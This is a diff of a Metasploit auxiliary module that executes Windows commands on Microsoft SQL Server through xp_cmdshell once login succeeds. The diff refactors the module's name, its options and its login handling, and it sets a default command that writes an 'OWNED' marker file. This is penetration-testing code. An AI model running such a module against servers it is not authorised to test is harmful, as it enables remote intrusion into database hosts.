@@ -18,34 +18,28 @@ class Metasploit3 < Msf::Auxiliary
 	
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'Run a command via xp_cmdshell',
+			'Name'           => 'Microsoft SQL Server xp_cmdshell Command Execution',
 			'Description'    => %q{
-					This module will execute a Windows command on a MSSQL/MSDE instance
-					via the xp_cmdshell procedure.
+				This module will execute a Windows command on a MSSQL/MSDE instance
+			via the xp_cmdshell procedure. A valid username and password is required
+			to use this module
 			},
 			'Author'         => [ 'tebo <tebo [at] attackresearch [dot] com' ],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
 			'References'     =>
 				[
-					[ 'URL', 'www.attackresearch.com' ],
 					[ 'URL', 'http://msdn.microsoft.com/en-us/library/cc448435(PROT.10).aspx'],
-				]))
+				]
+		))
 
-			register_options( 
-				[
-					OptString.new('MSSQL_USER', [ false, 'The username to authenticate as', 'sa']),
-					OptString.new('MSSQL_PASS', [ false, 'The password for the specified username', '']),
-					OptString.new('CMD', [ false, 'Command to execute',  'echo metasploit >> C:\\defenseisdead.txt']),
-				], self.class)
+		register_options( [
+			OptString.new('CMD', [ false, 'Command to execute',  'cmd.exe /c echo OWNED > C:\\owned.exe']),
+		], self.class)
 	end
 
 	def run
-		connect
-		if mssql_login(datastore['MSSQL_USER'], datastore['MSSQL_PASS'])
-			cmd = datastore['CMD']
-			cmd_exec(cmd)
-		end
+		mssql_xpcmdshell(datastore['CMD'], true) if mssql_login_datastore
 		disconnect
 	end
 end
